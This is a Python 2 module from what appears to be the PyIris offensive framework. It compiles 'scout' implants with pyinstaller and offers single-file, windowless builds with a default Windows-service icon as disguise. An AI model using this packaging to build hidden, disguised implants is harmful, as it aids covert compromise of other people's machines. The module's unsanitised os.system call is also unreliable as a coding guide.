import os
import ntpath
import shutil
import library.modules.config as config

config.main()

def main(path):
    if os.name == 'nt':
        filename = ntpath.basename(path)[:-3] + '.exe'
    else:
        filename = ntpath.basename(path)[:-3]
    print config.inf + 'Initiating compilation of scout : ' + path
    tags = []
    while True:
        option = raw_input(config.pro + 'Compress compiled scout into one file? [y|n] : ')
        if option in ('y', 'Y', 'yes', 'Yes'):
            tags.append('--onefile')
            break
        elif option in ('n', 'N', 'No', 'no'):
            break
        else:
            continue
    while True:
        option = raw_input(config.pro + 'Compile scout so that it runs without a window? [y|n] : ')
        if option in ('y', 'Y', 'yes', 'Yes'):
            tags.append('--windowed')
            break
        elif option in ('n', 'N', 'No', 'no'):
            break
        else:
            continue
    while True:
        option = raw_input(config.pro + 'Use a custom file icon (.ico) for the compiled scout? [y|n] : ')
        if option in ('y', 'Y', 'yes', 'Yes'):
            option = raw_input(config.pro + 'Path to file ico or press [enter] to use the default PyIris provided windows service icon (resources/windows_service.ico) : ')
            if not option:
                option = os.path.join(os.getcwd(), 'resources', 'windows_service.ico')
            tags.append('--icon ' + option)
            break
        elif option in ('n', 'N', 'No', 'no'):
            break
        else:
            continue
    command = 'pyinstaller ' + ' '.join(tags) + ' ' + path
    print config.inf + 'Removing residue folders...'
    if os.path.isdir(os.path.join(os.getcwd(), 'build')):
        shutil.rmtree('build')
    if os.path.isdir(os.path.join(os.getcwd(), 'dist')):
        shutil.rmtree('dist')
    if not os.path.isdir(os.path.join(os.getcwd(), 'generated')):
        os.makedirs(os.path.join(os.getcwd(), 'generated'))
    for i in os.listdir(os.getcwd()):
        if i.endswith('.spec'):
            os.remove(i)
    print config.inf + 'Compiling file...'
    os.system(command)
    if os.path.isdir(os.path.join(os.getcwd(), 'build')):
        shutil.rmtree('build')
    else:
        print config.neg + 'Error, could not successfully compile scout (Is "pyinstaller" installed and visible in your PATH?)'
        return
    if os.path.isdir(os.path.join(os.getcwd(), 'dist', ntpath.basename(path)[:-3])):
        if os.path.isdir(os.path.join(os.getcwd(), 'generated', ntpath.basename(path)[:-3])):
            print config.war + 'detected previous scout folder, deleting it to overwrite...'
            shutil.rmtree(os.path.join(os.getcwd(), 'generated', ntpath.basename(path)[:-3]))
        shutil.copytree(os.path.join(os.getcwd(), 'dist', ntpath.basename(path)[:-3]), os.path.join(os.getcwd(), 'generated', ntpath.basename(path)[:-3]))
        shutil.rmtree('dist')
        print config.pos + 'Successfully compiled scout folder to : ' + os.path.join(os.getcwd(), 'generated', filename[:-4])
    elif os.path.isdir(os.path.join(os.getcwd(), 'dist')):
        shutil.copy(os.path.join(os.getcwd(), 'dist', filename), os.path.join(os.getcwd(), 'generated', filename))
        shutil.rmtree('dist')
        print config.pos + 'Successfully compiled single file scout to : ' + os.path.join(os.getcwd(), 'generated', filename)
    else:
        print config.neg + 'Error, could not successfully compile scout (Is "pyinstaller" installed and visible in your PATH?)'
        return
    for i in os.listdir(os.getcwd()):
        if i.endswith('.spec'):
            os.remove(i)
